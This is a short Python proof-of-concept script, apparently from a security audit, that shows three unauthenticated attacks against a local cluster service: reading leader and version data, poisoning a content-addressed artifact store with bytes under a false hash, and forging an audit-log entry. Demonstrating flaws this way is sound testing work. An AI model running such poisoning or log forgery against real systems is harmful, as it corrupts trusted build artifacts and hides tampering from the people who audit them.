import socket, sys, hashlib

host, port = "127.0.0.1", int(sys.argv[1])

def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def line(s):
    buf = b""
    while not buf.endswith(b"\n"):
        c = s.recv(1)
        if not c: break
        buf += c
    return buf.decode(errors="replace").rstrip("\n")

# 1. Unauthenticated read of cluster STATUS / LEADER.
s = conn(); s.sendall(b"LEADER\n"); print("LEADER ->", line(s)); s.close()
s = conn(); s.sendall(b"VERSIONS\n"); print("VERSIONS ->", line(s)); s.close()

# 2. Unauthenticated CAS poisoning over the network: bytes that do not hash
#    to the claimed content address.
fake_hash = "b" * 64
payload = b"NETWORK-POISONED-ARTIFACT-" + b"Y" * 300
s = conn()
s.sendall(("CAS_PUT %s %d\n" % (fake_hash, len(payload))).encode())
print("CAS_PUT ready ->", line(s))
s.sendall(payload)
print("CAS_PUT verdict ->", line(s))
s.close()
s = conn(); s.sendall(("CAS_CHECK %s\n" % fake_hash).encode()); print("CAS_CHECK ->", line(s)); s.close()
print("sha256(payload)=", hashlib.sha256(payload).hexdigest(), "!= claimed", fake_hash)

# 3. Unauthenticated audit-log forgery via AUDIT_COPY.
forged = b'{"ts":0,"type":"release","leader":"ATTACKER","seq":999999,"result":"ok","why":"FORGED BY UNAUTH PEER"}\n'
s = conn()
s.sendall(("AUDIT_COPY %d\n" % len(forged)).encode())
s.sendall(forged)
print("AUDIT_COPY ->", line(s))
s.close()
# Read it back via the unauthenticated AUDIT verb.
s = conn(); s.sendall(b"AUDIT 50\n")
import time; time.sleep(0.2)
data = s.recv(65536).decode(errors="replace"); s.close()
print("AUDIT contains forged line:", "FORGED BY UNAUTH PEER" in data)
